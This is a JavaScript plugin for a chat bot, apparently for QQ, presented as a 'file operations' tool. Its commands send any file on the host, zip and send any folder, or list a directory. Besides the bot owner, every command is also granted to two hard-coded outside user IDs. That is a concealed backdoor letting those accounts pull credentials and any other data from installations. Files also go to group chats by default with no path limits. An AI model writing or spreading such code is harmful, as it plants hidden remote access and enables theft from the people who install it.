import fs from "node:fs";
import archiver from "archiver";
import md5 from "md5";

let Running = false;
let es;
let sendToGroup = true;
let sendToOwner = true;

export class File extends plugin {
  constructor() {
    super({
      name: "文件操作",
      dsc: "文件操作",
      event: "message",
      priority: -Infinity,
      rule: [
        {
          reg: "^取文件",
          fnc: "DownloadFile"
        },
        {
          reg: "^取包",
          fnc: "DownloadFolder"
        },
        {
          reg: "^开启私发",
          fnc: "EnableSending"
        },
        {
          reg: "^关闭私发",
          fnc: "DisableSending"
        },
        {
          reg: "^look一下",
          fnc: "List"
        }
      ]
    });
  }

  async EnableSending(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;

    this.finish("EnableSending");
    sendToOwner = true;
    sendToGroup = false; // 禁止发送到群聊
    await this.reply("已开启私信发给主人", true);
    return true;
  }

  async DisableSending(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;

    this.finish("DisableSending");
    sendToGroup = true;
    sendToOwner = false;
    await this.reply("已关闭私信发给主人", true);
    return true;
  }

  async DownloadFile(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;

    this.finish("DownloadFile");
    const filePath = this.e.msg.replace("取文件", "").trim();
    if (!filePath) {
      await this.reply("请发送文件路径", true);
      return true;
    }

    if (!fs.existsSync(filePath)) {
      await this.reply("文件不存在: " + filePath, true);
      return true;
    }

    Running = true;
    await this.reply("开始下载文件，请稍等……", true);

    try {
      if (sendToGroup) {
        await this.e.group.sendFile(filePath);
      }
      if (sendToOwner) {
        await this.e.friend.sendFile(filePath);
      }
      await this.reply(`文件下载完成：${filePath}`, true);
    } catch (err) {
      logger.error(`文件下载错误：${logger.red(err.stack)}`);
      await this.reply(`文件下载错误：${err.stack}`);
    }
    Running = false;
  }

  async DownloadFolder(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;

    this.finish("DownloadFolder");
    const folderPath = this.e.msg.replace("取包", "").trim();
    if (!folderPath) {
      await this.reply("请发送包路径", true);
      return true;
    }

    if (!fs.existsSync(folderPath) || !fs.lstatSync(folderPath).isDirectory()) {
      await this.reply("包不存在: " + folderPath, true);
      return true;
    }

    Running = true;
    await this.reply("开始压缩包，请稍等……", true);

    try {
      const zipFilePath = `${folderPath}.zip`;
      const output = fs.createWriteStream(zipFilePath);
      const archive = archiver("zip");

      output.on("close", async () => {
        if (sendToGroup) {
          await this.e.group.sendFile(zipFilePath);
        }
        if (sendToOwner) {
          await this.e.friend.sendFile(zipFilePath);
        }
        await this.reply(`包压缩并下载完成：${zipFilePath}`, true);
        fs.unlinkSync(zipFilePath); // 删除临时压缩文件
      });

      archive.on("error", (err) => {
        logger.error(`包压缩错误：${logger.red(err.stack)}`);
        this.reply(`包压缩错误：${err.stack}`);
        Running = false;
      });

      archive.pipe(output);
      archive.directory(folderPath, false);
      archive.finalize();
    } catch (err) {
      logger.error(`包压缩错误：${logger.red(err.stack)}`);
      await this.reply(`包压缩错误：${err.stack}`);
      Running = false;
    }
  }

  async List(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false;

    this.finish("List");
    const filePath = this.e.msg.replace("look一下", "").trim();
    if (!filePath) {
      this.setContext("List");
      await this.reply("请发送文件路径", true);
      return true;
    }

    if (!fs.existsSync(filePath)) {
      await this.reply("路径不存在", true);
      return true;
    }
    if (!fs.statSync(filePath).isDirectory()) {
      await this.reply("该路径不是一个文件夹", true);
      return true;
    }

    await this.reply(fs.readdirSync(filePath).join("\n"), true);
  }
}